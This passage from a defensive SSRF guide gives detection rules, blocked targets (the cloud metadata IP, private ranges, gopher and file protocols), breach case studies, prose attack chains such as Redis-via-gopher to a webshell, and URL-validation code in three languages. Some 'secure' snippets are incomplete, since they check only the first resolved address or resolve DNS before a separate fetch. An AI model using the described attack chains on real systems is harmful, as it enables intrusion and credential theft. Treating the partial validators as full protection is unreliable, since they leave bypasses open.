- **h2c upgrade restrictions**:
  - Disable h2c (cleartext HTTP/2) unless absolutely required
  - If h2c needed, validate upgrade requests thoroughly
  - Implement separate validation for HTTP/2 vs HTTP/1.1 paths

### Monitoring and Detection

> [!INFO] SSRF Detection Strategies
> Implement comprehensive logging and monitoring to detect SSRF attempts. Many SSRF attacks involve reconnaissance patterns that can be detected before exploitation.

**Log all URL fetch operations:**
```python
import logging

def fetch_url(url):
    logger.info(f"Fetching URL: {url}, User: {current_user}, IP: {request.remote_addr}")
    # ... fetch logic
```

**Monitor for suspicious patterns:**
- Requests to 169.254.169.254 (cloud metadata)
- Requests to RFC 1918 addresses (10.x, 172.16.x, 192.168.x)
- Requests to localhost/127.0.0.1
- Rapid sequential requests (port scanning)
- Requests with unusual protocols (gopher, dict, file)
- DNS rebinding (rapid DNS changes with TTL < 60s)

**Implement alerting:**
```yaml
# Example Prometheus alert rule
- alert: PossibleSSRFAttack
  expr: |
    rate(http_requests_to_metadata_ip[5m]) > 0
  annotations:
    summary: "Possible SSRF attempt to cloud metadata service"
    description: "{{ $labels.instance }} is making requests to 169.254.169.254"
```

**Enable comprehensive logging:**
- Source IP and user identity
- Requested URL (before and after any transformations)
- DNS resolution results
- Response status codes and timing
- Any validation failures or blocked requests

### Secure Development Practices

- **Code review checklist**:
  - [ ] Are all external URLs validated before use?
  - [ ] Is DNS resolution validated?
  - [ ] Are redirects handled securely?
  - [ ] Are private IP ranges blocked?
  - [ ] Is the metadata service IP blocked?
  - [ ] Are protocols restricted to http/https only?
  - [ ] Are timeouts configured?
  - [ ] Is logging comprehensive?

- **Security testing**:
  - Include SSRF tests in penetration testing scope
  - Test all URL parameters with SSRF payloads
  - Verify network-level controls are effective
  - Test bypass techniques (DNS rebinding, IPv6-mapped IPv4, etc.)

- **Dependency management**:
  - Keep HTTP libraries updated (urllib, requests, axios, etc.)
  - Review CVEs for SSRF in dependencies
  - Use libraries with built-in SSRF protections when available

## Real-World Examples

### Case Studies

- **Capital One Breach (2019)**
  - Exploitation of metadata service via SSRF in WAF
  - Impact: 100M+ customer records exposed
  - Root cause: Network-level access to IMDS from compromised workload
  - Lesson: Implement network-level blocking of metadata service

- **Gitlab SSRF (2019)**
  - Improper URL validation in import feature
  - Could access internal services including Redis
  - Allowed reading arbitrary files via file:// protocol
  - Lesson: Validate protocols and implement strict allowlists

- **Microsoft Purview SSRF (2025)**
  - Misconfigured proxy endpoint allowed metadata-service access
  - Led to cross-tenant data exposure in multi-tenant SaaS
  - Demonstrated impact of SSRF in cloud-native applications
  - Lesson: Multi-tenant environments require strict tenant isolation at network level

- **Uber SSO SSRF (2020)**
  - SSRF in SSO implementation allowed internal network access
  - Used to access internal API gateway
  - Exploited to retrieve sensitive configuration data
  - Lesson: SSO and authentication flows are high-value SSRF targets

### Common Attack Scenarios

- **Cloud metadata access leading to credential theft**
  - Attacker uses SSRF to access 169.254.169.254
  - Extracts IAM role credentials from metadata service
  - Uses credentials to access cloud resources (S3, databases, etc.)
  - Pivots to other cloud services using stolen credentials

- **Internal service enumeration through port scanning**
  - Attacker uses SSRF to scan internal network ranges
  - Identifies running services by port (database on 3306, Redis on 6379)
  - Maps internal network topology
  - Targets vulnerable internal services

- **Redis unauthorized access via Gopher protocol**
  - Attacker crafts Gopher URL to send Redis commands
  - Uses CONFIG SET to change Redis configuration
  - Writes webshell to web-accessible directory
  - Achieves remote code execution on server

- **Jenkins exploitation through internal access**
  - SSRF used to access Jenkins on internal network
  - Exploits script console for RCE
  - Retrieves credentials stored in Jenkins
  - Compromises CI/CD pipeline

- **Kubernetes cluster compromise via SSRF**
  - SSRF in containerized application
  - Extracts service account token from pod filesystem
  - Uses token to access Kubernetes API
  - Escalates to cluster admin and compromises multiple namespaces

## Framework-Specific SSRF

### Node.js

- **Axios validation bypass techniques**:
  ```javascript
  // Vulnerable: No validation
  axios.get(userInput)

  // Secure: Strict validation
  const validUrl = (url) => {
    const parsed = new URL(url);
    if (parsed.protocol !== 'https:') return false;
    if (parsed.hostname === 'localhost') return false;
    // Add more checks
    return true;
  };

  if (validUrl(userInput)) {
    axios.get(userInput);
  }
  ```

- **http-proxy misconfigurations**:
  - Allowing user-controlled target parameter
  - Missing hostname validation

- **request module vulnerabilities** (deprecated):
  - CVE-2023-28155: SSRF via redirect
  - Recommendation: Migrate to axios or node-fetch

- **Axios path-relative URL bypass** (CVE-2024-39338):
  - Upgrade to axios ≥ 1.7.4
  - Validate URLs before passing to axios

**Node.js SSRF Prevention Example:**

```javascript
const axios = require('axios');
const { URL } = require('url');
const dns = require('dns').promises;
const ipaddr = require('ipaddr.js');

async function safeFetch(urlString) {
  // Stage 1: Parse and validate URL
  let url;
  try {
    url = new URL(urlString);
  } catch (e) {
    throw new Error('Invalid URL');
  }

  // Only allow https
  if (url.protocol !== 'https:') {
    throw new Error('Only HTTPS allowed');
  }

  // Stage 2: Resolve DNS and validate IP
  const addresses = await dns.resolve4(url.hostname);
  const ip = ipaddr.parse(addresses[0]);

  // Check for private ranges
  if (ip.range() === 'private' ||
      ip.range() === 'loopback' ||
      ip.range() === 'linkLocal') {
    throw new Error('Private IP addresses not allowed');
  }

  // Check for cloud metadata
  if (addresses[0] === '169.254.169.254') {
    throw new Error('Metadata service access blocked');
  }

  // Make request with strict options
  return axios.get(urlString, {
    maxRedirects: 2,
    timeout: 5000,
    validateStatus: (status) => status < 400,
    maxContentLength: 10 * 1024 * 1024, // 10MB limit
  });
}
```

### Python

- **requests library security considerations**:
  ```python
  import requests
  from urllib.parse import urlparse

  # Vulnerable
  requests.get(user_input)

  # Secure
  def safe_get(url):
      parsed = urlparse(url)
      if parsed.scheme not in ['https']:
          raise ValueError('Only HTTPS allowed')
      if parsed.hostname in ['localhost', '127.0.0.1']:
          raise ValueError('Localhost not allowed')
      return requests.get(url, timeout=5, allow_redirects=False)
  ```

- **urllib parsing inconsistencies**:
  - Different parsing behavior between urllib and requests
  - Test with both libraries if used together

- **Flask/Django SSRF prevention**:
  ```python
  # Flask example with validation
  from flask import request, jsonify
  import validators

  @app.route('/fetch')
  def fetch_url():
      url = request.args.get('url')

      if not validators.url(url):
          return jsonify({'error': 'Invalid URL'}), 400

      if not is_safe_url(url):
          return jsonify({'error': 'Unsafe URL'}), 403

      response = requests.get(url, timeout=5)
      return response.content
  ```

**Python SSRF Prevention Example:**

```python
import requests
import socket
import ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    """
    Validates URL is safe from SSRF attacks
    Returns True if safe, False otherwise
    """
    # Parse URL
    try:
        parsed = urlparse(url)
    except ValueError:
        return False

    # Validate scheme
    if parsed.scheme not in ['http', 'https']:
        return False

    hostname = parsed.hostname
    if not hostname:
        return False

    # Resolve DNS
    try:
        ip = socket.gethostbyname(hostname)
    except socket.gaierror:
        return False

    # Validate IP is not private/reserved
    try:
        ip_obj = ipaddress.ip_address(ip)

        # Check for private ranges
        if ip_obj.is_private:
            return False

        # Check for loopback
        if ip_obj.is_loopback:
            return False

        # Check for link-local (169.254.x.x)
        if ip_obj.is_link_local:
            return False

        # Specific check for cloud metadata
        if str(ip_obj) == '169.254.169.254':
            return False

    except ValueError:
        return False

    return True

def safe_fetch(url):
    """
    Safely fetches URL with SSRF protections
    """
    if not is_safe_url(url):
        raise ValueError('URL failed security validation')

    response = requests.get(
        url,
        timeout=5,
        allow_redirects=False,
        headers={'User-Agent': 'SafeFetchBot/1.0'}
    )

    return response
```

### Java

- **URLConnection security practices**:
  ```java
  // Vulnerable
  URL url = new URL(userInput);
  URLConnection conn = url.openConnection();

  // Secure
  URL url = new URL(userInput);
  if (!isSafeUrl(url)) {
      throw new SecurityException("Unsafe URL");
  }
  HttpURLConnection conn = (HttpURLConnection) url.openConnection();
  conn.setInstanceFollowRedirects(false);
  conn.setConnectTimeout(5000);
  ```

- **Spring framework protections**:
  ```java
  @RestController
  public class FetchController {
      @GetMapping("/fetch")
      public ResponseEntity<String> fetch(@RequestParam String url) {
          if (!UrlValidator.isValid(url)) {
              return ResponseEntity.badRequest().build();
          }
          // ... fetch logic
      }
  }
  ```

- **Apache HttpClient considerations**:
  - Configure timeouts
  - Disable redirects or limit redirect count
  - Validate URLs before use

- **Apache CXF Aegis databinding SSRF** (CVE-2024-28752):
  - Update Apache CXF to latest version
  - Avoid Aegis databinding if possible

**Java SSRF Prevention Example:**

```java
import java.net.*;
import java.io.*;
import java.util.regex.Pattern;

public class SafeUrlFetcher {

    private static final Pattern PRIVATE_IP_PATTERN = Pattern.compile(
        "^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)"
    );

    public static boolean isSafeUrl(String urlString) throws Exception {
        URL url = new URL(urlString);

        // Validate protocol
        String protocol = url.getProtocol();
        if (!protocol.equals("https")) {
            return false;
        }

        // Resolve hostname
        String hostname = url.getHost();
        InetAddress addr = InetAddress.getByName(hostname);
        String ip = addr.getHostAddress();

        // Check for loopback
        if (addr.isLoopbackAddress()) {
            return false;
        }

        // Check for link-local
        if (addr.isLinkLocalAddress()) {
            return false;
        }

        // Check for private IP
        if (PRIVATE_IP_PATTERN.matcher(ip).find()) {
            return false;
        }

        // Check for metadata service
        if (ip.equals("169.254.169.254")) {
            return false;
        }

        return true;
    }

    public static String fetchUrl(String urlString) throws Exception {
        if (!isSafeUrl(urlString)) {
            throw new SecurityException("URL failed security validation");
        }

        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setInstanceFollowRedirects(false);
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);

        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream()))) {
            StringBuilder content = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line);
            }
            return content.toString();
        }
    }
}
```


